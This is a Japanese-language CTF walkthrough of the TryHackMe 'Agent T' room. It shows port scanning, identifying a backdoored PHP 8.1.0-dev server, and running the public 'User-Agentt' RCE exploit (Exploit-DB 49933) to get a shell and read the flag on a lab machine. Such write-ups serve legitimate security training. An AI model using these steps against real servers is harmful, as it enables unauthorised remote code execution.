# Agent T CTF

https://tryhackme.com/room/agentt

```text
エージェント T がこの Web サイトを発見しました。一見無害に見えますが、サーバーの応答方法がおかしいようです...
```

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.225.165
root@ip-10-10-7-31:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 04:51 GMT
Nmap scan report for 10.10.225.165
Host is up (0.014s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:62:14:40:5D:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
root@ip-10-10-7-31:~# sudo nmap -sV -p80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 04:52 GMT
Nmap scan report for 10.10.225.165
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
MAC Address: 02:62:14:40:5D:3F (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds
```

管理者ダッシュボードが表示される。

ヒントに従って、サーバーからの応答に注目。

```http
GET / HTTP/1.1
Host: 10.10.225.165
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1


HTTP/1.1 200 OK
Host: 10.10.225.165
Date: Wed, 12 Mar 2025 04:52:46 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
```

## PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution

PHP/8.1.0-dev に、RCE 脆弱性がある。

https://www.exploit-db.com/exploits/49933

```shell
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                               | php/webapps/49933.py
```

```shell
$ python ./49933.py
Enter the full host url:
http://10.10.225.165

Interactive shell is opened on http://10.10.225.165
Can't acces tty; job crontol turned off.
$ pwd
/var/www/html
```

```shell
$ ls -al /
total 76
drwxr-xr-x   1 root root 4096 Mar  7  2022 .
drwxr-xr-x   1 root root 4096 Mar  7  2022 ..
-rwxr-xr-x   1 root root    0 Mar  7  2022 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 30  2021 bin
drwxr-xr-x   2 root root 4096 Nov 22  2020 boot
drwxr-xr-x   5 root root  340 Mar 12 04:51 dev
drwxr-xr-x   1 root root 4096 Mar  7  2022 etc
-rw-rw-r--   1 root root   38 Mar  5  2022 flag.txt
drwxr-xr-x   2 root root 4096 Nov 22  2020 home
drwxr-xr-x   1 root root 4096 Mar 30  2021 lib
drwxr-xr-x   2 root root 4096 Jan 11  2021 lib64
drwxr-xr-x   2 root root 4096 Jan 11  2021 media
drwxr-xr-x   2 root root 4096 Jan 11  2021 mnt
drwxr-xr-x   2 root root 4096 Jan 11  2021 opt
dr-xr-xr-x 149 root root    0 Mar 12 04:51 proc
drwx------   2 root root 4096 Jan 11  2021 root
drwxr-xr-x   3 root root 4096 Jan 11  2021 run
drwxr-xr-x   2 root root 4096 Jan 11  2021 sbin
drwxr-xr-x   2 root root 4096 Jan 11  2021 srv
dr-xr-xr-x  13 root root    0 Mar 12 04:51 sys
drwxrwxrwt   1 root root 4096 Mar 30  2021 tmp
drwxr-xr-x   1 root root 4096 Jan 11  2021 usr
drwxr-xr-x   1 root root 4096 Mar 30  2021 var

$ cat /flag.txt
flag{...........................}
```

フラグゲット！

## 振り返り

- nmap のバージョンにもしっかり表示されているが、ヒントが無ければなかなか気付けなかったと思われる

## Tags

#tags:PHP脆弱性
